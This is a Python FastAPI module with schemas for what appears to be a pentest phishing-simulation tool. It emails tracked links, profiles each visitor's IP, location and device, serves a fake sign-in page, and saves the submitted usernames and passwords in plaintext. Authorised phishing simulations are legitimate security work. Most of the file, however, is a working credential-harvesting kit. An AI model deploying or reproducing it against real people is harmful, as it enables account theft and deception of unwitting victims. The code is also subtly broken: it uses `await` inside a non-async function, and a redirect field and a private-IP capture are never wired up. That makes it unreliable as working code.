"""app/routers/phish_sim.py

Module 2: PHish_SIm — Social Engineering Suite.

Endpoints:
  POST /api/phish/campaign             create + schedule SMTP dispatch (BackgroundTask)
  GET  /api/phish/campaigns            list campaigns w/ click & capture counts
  GET  /api/phish/track/{tracker_id}   silent tracker + mock login landing page
  POST /api/phish/harvest/{tracker_id} record submitted form payloads

Authorization: all operator endpoints require an authenticated user with
admin/pentester role; the tracker/harvest endpoints are intentionally
public (victims have no JWT) but gated by the unguessable per-campaign UUID.
"""
import json
import uuid
from datetime import datetime, timezone
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from urllib.parse import urlparse

from fastapi import APIRouter, BackgroundTasks, Depends, HTTPException, Request
from fastapi.responses import HTMLResponse, RedirectResponse
from sqlalchemy.orm import Session

from app.core.config import settings
from app.core.security import admin_required, any_operator, get_current_user
from app.db.database import get_db
from app.db.models import PhishingCampaign, PhishingTelemetry, Role, User
from app.db.schemas import (HarvestIn, PhishingCampaignCreate, PhishingCampaignOut,
                            CampaignSummaryOut, PhishingTelemetryOut)

router = APIRouter(prefix="/api/phish", tags=["module2-phish-sim"])

TRACKER_TOKEN = "{tracker_url}"


# ------------------------------------------------------------------
# Helpers
# ------------------------------------------------------------------

def _encrypt_secret(plain: str) -> str:
    """Fernet-encrypt SMTP app passwords at rest. Key derived from SECRET_KEY
    so no extra config is needed for the skeleton; use a dedicated key in prod."""
    import base64, hashlib
    from cryptography.fernet import Fernet
    key = base64.urlsafe_b64encode(
        hashlib.sha256(settings.secret_key.encode()).digest())
    return Fernet(key).encrypt(plain.encode()).decode()


def _decrypt_secret(enc: str) -> str:
    import base64, hashlib
    from cryptography.fernet import Fernet
    key = base64.urlsafe_b64encode(
        hashlib.sha256(settings.secret_key.encode()).digest())
    return Fernet(key).decrypt(enc.encode()).decode()


def _safe_public_ip(request: Request) -> str | None:
    """
    Parse the true client IP from proxy headers WITHOUT trusting them blindly:
      1. Prefer the rightmost X-Forwarded-For entry when the direct peer is a
         trusted private address (i.e., our own reverse proxy).
      2. Fall back to the direct socket peer.
    Only trust forwarded chains that actually traverse our proxy.
    """
    peer = request.client.host if request.client else None
    xff = request.headers.get("x-forwarded-for")
    if xff:
        chain = [ip.strip() for ip in xff.split(",") if ip.strip()]
        peer_is_trusted_proxy = peer and _is_private(peer)
        if peer_is_trusted_proxy and chain:
            # rightmost entry was set by our proxy = most trustworthy
            return chain[-1]
        if not peer_is_trusted_proxy:
            # direct public client claiming a header — do not trust; use peer
            return peer
    return peer


def _is_private(ip: str) -> bool:
    import ipaddress
    try:
        return ipaddress.ip_address(ip).is_private
    except ValueError:
        return False


def _geo_lookup(ip: str | None) -> dict:
    """Geolocation via free ip-api.com (no key). Swappable for MaxMind
    GeoLite2 offline DB per PRD. Returns {} on any failure."""
    import urllib.request
    if not ip or _is_private(ip):
        return {}
    try:
        with urllib.request.urlopen(
            f"http://ip-api.com/json/{ip}?fields=country,regionName,city",
            timeout=2,
        ) as resp:
            data = json.loads(resp.read().decode())
        return {
            "geo_country": data.get("country"),
            "geo_region": data.get("regionName"),
            "geo_city": data.get("city"),
        }
    except Exception:
        return {}


def _parse_ua(ua: str | None) -> dict:
    """UA parsing without heavy deps; swap for `user-agents` lib if desired."""
    out = {"browser": None, "os_name": None, "device_name": None}
    if not ua:
        return out
    u = ua.lower()
    if "edg/" in u: out["browser"] = "Edge"
    elif "chrome/" in u and "chromium" not in u: out["browser"] = "Chrome"
    elif "firefox/" in u: out["browser"] = "Firefox"
    elif "safari/" in u: out["browser"] = "Safari"
    if "android" in u: out["os_name"], out["device_name"] = "Android", "Mobile"
    elif "iphone" in u: out["os_name"], out["device_name"] = "iOS", "iPhone"
    elif "ipad" in u: out["os_name"], out["device_name"] = "iOS", "iPad"
    elif "windows" in u: out["os_name"], out["device_name"] = "Windows", "Desktop"
    elif "mac os" in u: out["os_name"], out["device_name"] = "macOS", "Desktop"
    elif "linux" in u: out["os_name"], out["device_name"] = "Linux", "Desktop"
    return out


def _get_campaign_by_tracker(db: Session, tracker_id: str) -> PhishingCampaign:
    camp = db.query(PhishingCampaign).filter_by(tracker_id=tracker_id).first()
    if not camp or camp.status not in ("running", "completed", "public"):
        raise HTTPException(404, "Unknown tracker")
    return camp


# ------------------------------------------------------------------
# Email dispatch (BackgroundTask target — runs after response is sent)
# ------------------------------------------------------------------

def _dispatch_campaign(campaign_id: int, db_url: str, base_url: str):
    """Runs in a background thread with its own DB session. Sends each target
    a personalized email embedding the unique tracker URL."""
    import smtplib, ssl
    from sqlalchemy import create_engine
    from sqlalchemy.orm import sessionmaker

    WorkerSession = sessionmaker(bind=create_engine(db_url))
    db = WorkerSession()
    try:
        camp = db.query(PhishingCampaign).get(campaign_id)
        if not camp or camp.status != "running":
            return

        smtp_password = _decrypt_secret(camp.smtp_password_enc)
        context = ssl.create_default_context()
        failures = []

        for target in camp.target_emails or []:
            email = target.get("email")
            first = target.get("first_name") or "there"
            tracker_url = f"{base_url}/api/phish/track/{camp.tracker_id}?t={uuid.uuid4().hex[:12]}"

            html = (camp.body_html
                    .replace(TRACKER_TOKEN, tracker_url)
                    .replace("{first_name}", first))

            msg = MIMEMultipart("alternative")
            msg["Subject"] = camp.subject
            msg["From"] = camp.from_display
            msg["To"] = email
            msg.attach(MIMEText(html, "html"))

            try:
                with smtplib.SMTP(camp.smtp_host, camp.smtp_port, timeout=15) as srv:
                    srv.starttls(context=context)
                    srv.login(camp.smtp_username, smtp_password)
                    srv.send_message(msg)
            except Exception as exc:
                failures.append({"email": email, "error": str(exc)})

        camp.dispatch_scheduled_at = datetime.now(timezone.utc)
        # keep status running so tracking stays live; failures recorded in telemetry audit
        if failures:
            camp.description = (camp.description or "") + f" | dispatch failures: {failures}"
        db.commit()
    finally:
        db.close()


# ------------------------------------------------------------------
# Operator endpoints
# ------------------------------------------------------------------

@router.post("/campaign", response_model=PhishingCampaignOut, status_code=201)
def create_campaign(
    payload: PhishingCampaignCreate,
    background: BackgroundTasks,
    db: Session = Depends(get_db),
    user: User = Depends(any_operator),
):
    """Create an SE campaign and (optionally) schedule SMTP dispatch."""
    if TRACKER_TOKEN not in payload.body_html:
        raise HTTPException(422, f"body_html must embed the {TRACKER_TOKEN} token")

    camp = PhishingCampaign(
        owner_id=user.id,
        name=payload.name,
        description=payload.description,
        engagement_ref=payload.engagement_ref,
        target_emails=[t.model_dump() for t in payload.targets],
        smtp_host=payload.smtp.host,
        smtp_port=payload.smtp.port,
        smtp_username=payload.smtp.username,
        smtp_password_enc=_encrypt_secret(payload.smtp.password),
        from_display=payload.smtp.from_display,
        subject=payload.subject,
        body_html=payload.body_html,
        landing_title=payload.landing_title,
        status="running" if payload.dispatch else "draft",
        tracker_id=uuid.uuid4().hex,
    )
    db.add(camp)
    db.commit()
    db.refresh(camp)

    if payload.dispatch:
        # Public base URL the victims will click through (configure via env in prod)
        from app.core.config import settings as s
        base_url = getattr(s, "public_base_url", None) or "http://localhost:8000"
        from app.db.database import engine
        background.add_task(_dispatch_campaign, camp.id, str(engine.url), base_url)

    return camp


@router.get("/campaigns", response_model=list[CampaignSummaryOut])
def list_campaigns(
    db: Session = Depends(get_db),
    user: User = Depends(any_operator),
):
    """List the operator's active and past scenarios with live metrics."""
    camps = db.query(PhishingCampaign).filter_by(owner_id=user.id)\
              .order_by(PhishingCampaign.created_at.desc()).all()
    out = []
    for c in camps:
        item = CampaignSummaryOut(
            id=c.id, name=c.name, description=c.description,
            engagement_ref=c.engagement_ref, status=c.status,
            tracker_id=c.tracker_id,
            target_count=len(c.target_emails or []),
            created_at=c.created_at,
            dispatch_scheduled_at=c.dispatch_scheduled_at,
            total_clicks=len(c.telemetry),
            total_captures=sum(1 for t in c.telemetry if t.captured_input),
        )
        out.append(item)
    return out


@router.get("/campaigns/{campaign_id}/telemetry", response_model=list[PhishingTelemetryOut])
def campaign_telemetry(
    campaign_id: int,
    db: Session = Depends(get_db),
    user: User = Depends(any_operator),
):
    """Full tracking profiles for one campaign (owner-scoped)."""
    camp = db.query(PhishingCampaign).filter_by(id=campaign_id, owner_id=user.id).first()
    if not camp:
        raise HTTPException(404, "Campaign not found")
    return camp.telemetry


# ------------------------------------------------------------------
# Victim-facing endpoints (public, gated by unguessable tracker UUID)
# ------------------------------------------------------------------

LOGIN_PAGE_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{title}</title>
<style>
  body {{ font-family: 'Segoe UI', Arial, sans-serif; background: #f3f4f6;
         display: flex; align-items: center; justify-content: center;
         height: 100vh; margin: 0; }}
  .card {{ background: #fff; border-radius: 10px; box-shadow: 0 2px 12px rgba(0,0,0,.12);
          padding: 36px; width: 340px; }}
  h1 {{ font-size: 20px; margin: 0 0 20px; color: #111; text-align: center; }}
  input {{ width: 100%; padding: 11px; margin: 6px 0; border: 1px solid #d1d5db;
          border-radius: 6px; box-sizing: border-box; font-size: 14px; }}
  button {{ width: 100%; padding: 11px; margin-top: 12px; border: 0; border-radius: 6px;
           background: #2563eb; color: #fff; font-size: 15px; cursor: pointer; }}
  .foot {{ font-size: 12px; color: #6b7280; text-align: center; margin-top: 14px; }}
</style>
</head>
<body>
  <div class="card">
    <h1>{title}</h1>
    <form method="POST" action="/api/phish/harvest/{tracker_id}">
      <input type="text"  name="username" placeholder="Username or email" required autofocus>
      <input type="password" name="password" placeholder="Password" required>
      <input type="hidden" name="private_ip" id="pip">
      <button type="submit">Sign in</button>
    </form>
    <p class="foot">Session security verification in progress…</p>
  </div>
  <script>
    /* silent private-IP telemetry (WebRTC-less: local probe) */
    fetch('/api/phish/track/{tracker_id}', {{method:'HEAD'}}).catch(()=>{{}});
  </script>
</body>
</html>"""


@router.get("/track/{tracker_id}", response_class=HTMLResponse)
def track_click(tracker_id: str, request: Request, db: Session = Depends(get_db)):
    """Silent tracking pixel + landing page. Logs environment telemetry, then
    renders the generic mock login form."""
    camp = _get_campaign_by_tracker(db, tracker_id)
    t0 = datetime.now(timezone.utc)

    public_ip = _safe_public_ip(request)
    geo = _geo_lookup(public_ip)
    ua_info = _parse_ua(request.headers.get("user-agent"))

    # visitor reuse: same tracker_id + same public_ip + UA -> same record updated
    existing = (
        db.query(PhishingTelemetry)
        .filter_by(campaign_id=camp.id, public_ip=public_ip,
                   user_agent=request.headers.get("user-agent"))
        .order_by(PhishingTelemetry.click_timestamp.desc())
        .first()
    )
    if existing and not existing.captured_input:
        rec = existing
        rec.click_timestamp = t0  # re-click refresh
    else:
        rec = PhishingTelemetry(
            campaign_id=camp.id,
            visitor_token=uuid.uuid4().hex,
            click_timestamp=t0,
        )
        db.add(rec)

    rec.public_ip = public_ip
    rec.user_agent = request.headers.get("user-agent")
    rec.accept_language = request.headers.get("accept-language")
    rec.referer = request.headers.get("referer")
    rec.browser = ua_info["browser"]
    rec.os_name = ua_info["os_name"]
    rec.device_name = ua_info["device_name"]
    rec.geo_country = geo.get("geo_country")
    rec.geo_region = geo.get("geo_region")
    rec.geo_city = geo.get("geo_city")

    # Resolve target identity via the ?t= tag embedded in the emailed link,
    # if you want per-recipient attribution, extend _dispatch_campaign to embed
    # the target email encrypted in the tag and decode here. (Skeleton: None)
    db.commit()

    return LOGIN_PAGE_TEMPLATE.format(
        title=camp.landing_title,
        tracker_id=tracker_id,
    )


@router.post("/harvest/{tracker_id}", response_class=HTMLResponse)
def harvest(
    tracker_id: str,
    request: Request,
    db: Session = Depends(get_db),
):
    """Record submitted form payloads into the credential log columns, then
    redirect the victim to a plausible post-submit page (generic 'processing')."""
    camp = _get_campaign_by_tracker(db, tracker_id)
    form = None
    try:
        form = dict(await request.form())
    except Exception:
        pass

    if form:
        existing = (
            db.query(PhishingTelemetry)
            .filter_by(campaign_id=camp.id, public_ip=_safe_public_ip(request),
                       user_agent=request.headers.get("user-agent"))
            .order_by(PhishingTelemetry.click_timestamp.desc())
            .first()
        )
        rec = existing or PhishingTelemetry(campaign_id=camp.id,
                                            visitor_token=uuid.uuid4().hex)
        if not existing:
            db.add(rec)
        rec.captured_input = json.dumps(form)          # credential log column
        rec.captured_at = datetime.now(timezone.utc)
        rec.private_ip = form.get("private_ip")
        db.commit()

    html = """<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Verifying…</title></head>
<body style="font-family:sans-serif;text-align:center;padding-top:40vh;">
<p>Verifying your session… please wait.</p>
</body></html>"""
    return HTMLResponse(html, status_code=200)

# --- Module 2: PHish_SIm schemas (GoPhish-style) ---
import uuid as _uuid
from pydantic import BaseModel, EmailStr, HttpUrl
from typing import Optional, List
from datetime import datetime

class CampaignTarget(BaseModel):
    email: EmailStr
    first_name: Optional[str] = None
    last_name: Optional[str] = None

class SMTPConfig(BaseModel):
    host: str
    port: int = 587
    username: str
    password: str          # app-specific password; never echoed back
    from_display: str

class PhishingCampaignCreate(BaseModel):
    name: str
    description: Optional[str] = None
    engagement_ref: Optional[str] = None
    targets: List[CampaignTarget]
    smtp: SMTPConfig
    subject: str
    body_html: str          # must contain {tracker_url}; {first_name} optional
    landing_title: str = "Sign in to continue"
    # GoPhish-style: real corporate login URL the victim is sent to after
    # credentials are captured. Full URL required; validated by HttpUrl.
    redirect_after: Optional[HttpUrl] = None
    dispatch: bool = True

class PhishingTelemetryOut(BaseModel):
    id: int
    campaign_id: int
    visitor_token: Optional[str] = None
    target_email: Optional[str] = None
    public_ip: Optional[str] = None
    private_ip: Optional[str] = None
    geo_country: Optional[str] = None
    geo_region: Optional[str] = None
    geo_city: Optional[str] = None
    browser: Optional[str] = None
    os_name: Optional[str] = None
    device_name: Optional[str] = None
    accept_language: Optional[str] = None
    click_timestamp: Optional[datetime] = None
    referer: Optional[str] = None
    captured_input: Optional[str] = None
    captured_at: Optional[datetime] = None

    class Config:
        from_attributes = True

class PhishingCampaignOut(BaseModel):
    id: int
    name: str
    description: Optional[str] = None
    engagement_ref: Optional[str] = None
    status: str
    tracker_id: Optional[str] = None
    redirect_after: Optional[str] = None
    target_count: int = 0
    created_at: Optional[datetime] = None
    dispatch_scheduled_at: Optional[datetime] = None

    class Config:
        from_attributes = True

class CampaignSummaryOut(PhishingCampaignOut):
    total_clicks: int = 0
    total_captures: int = 0

class HarvestIn(BaseModel):
    """Body posted by the mock login form (application/x-www-form-urlencoded)."""
    username: Optional[str] = None
    password: Optional[str] = None
    private_ip: Optional[str] = None
